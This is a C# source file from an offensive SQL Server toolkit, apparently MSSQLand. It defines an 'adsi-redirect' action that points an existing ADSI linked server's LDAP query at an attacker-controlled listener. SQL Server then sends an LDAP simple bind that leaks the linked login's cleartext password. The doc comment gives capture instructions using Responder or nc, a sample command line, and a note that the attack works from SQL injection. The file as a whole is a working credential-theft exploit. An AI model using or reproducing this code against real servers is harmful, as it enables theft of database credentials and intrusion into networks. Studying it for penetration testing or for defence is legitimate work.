// MSSQLand/Actions/Domain/AdsiRedirect.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;

namespace MSSQLand.Actions.Domain
{
    /// <summary>
    /// Redirects an ADSI linked server LDAP query to an attacker-controlled listener.
    /// SQL Server performs an LDAP simple bind, leaking the configured linked login's cleartext password.
    ///
    /// No privileges required (only OPENQUERY access to an existing ADSI linked server).
    /// Works from SQL injection context. Capture with Responder, nc, or Wireshark.
    ///
    /// For responder: sudo responder -I eth0 --lm
    ///
    /// Note: if the ADSI server uses useself=TRUE (no explicit linked login), the bind uses
    /// the current SQL context's password (only useful when that identity is unknown to you)
    /// (e.g. landing as sa via a linked server chain).
    ///
    /// dotnet MSSQLand.exe LAB-SQL01 -c local -u analyst -p "..." adsi-redirect 192.168.1.10
    /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
    /// </summary>
    internal class AdsiRedirect : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Attacker-controlled listener")]
        private string _listenerAddress = "";

        [ArgumentMetadata(Position = 1, Description = "Target ADSI server name (auto-discovers if omitted)")]
        private string _targetServer = "";

        public override void ValidateArguments(string[] args)
        {
            BindArguments(args);

            if (string.IsNullOrWhiteSpace(_listenerAddress))
                throw new ArgumentException("Listener address is required. Usage: adsi-redirect <listener-ip> [adsi-server]");

            if (args != null && args.Length > 2)
                throw new ArgumentException("Usage: adsi-redirect <listener-ip> [adsi-server]");
        }

        public override object Execute(DatabaseContext databaseContext)
        {
            AdsiService adsiService = new(databaseContext);

            if (string.IsNullOrWhiteSpace(_targetServer))
            {
                var servers = adsiService.GetAdsiServerNames();
                if (servers.Count == 0)
                {
                    Logger.Error("No ADSI linked server found on the execution target.");
                    Logger.TaskNested("List linked servers with: links");
                    return null;
                }

                _targetServer = servers[0];
                Logger.TaskNested($"Found existing ADSI linked server: '{_targetServer}'");
            }
            else if (!adsiService.AdsiServerExists(_targetServer))
            {
                Logger.Error($"ADSI linked server '{_targetServer}' not found.");
                Logger.InfoNested("List available ADSI servers with: adsi");
                return null;
            }

            string listenerAddr = _listenerAddress.Contains(":") ? _listenerAddress : $"{_listenerAddress}:389";
            string redirectQuery = $"SELECT * FROM OPENQUERY([{_targetServer}], 'SELECT * FROM ''LDAP://{listenerAddr}'' ')";

            Logger.TaskNested($"Redirecting ADSI LDAP bind via '{_targetServer}' to {listenerAddr}");
            try
            {
                databaseContext.QueryService.ExecuteNonProcessing(redirectQuery);
            }
            catch
            {
                // Expected. ADSI query fails to return a rowset, but the LDAP simple bind
                // has already left the SQL Server toward the attacker-controlled listener.
            }

            Logger.Success("Query fired. Check your listener for the incoming LDAP simple bind.");
            return null;
        }
    }
}
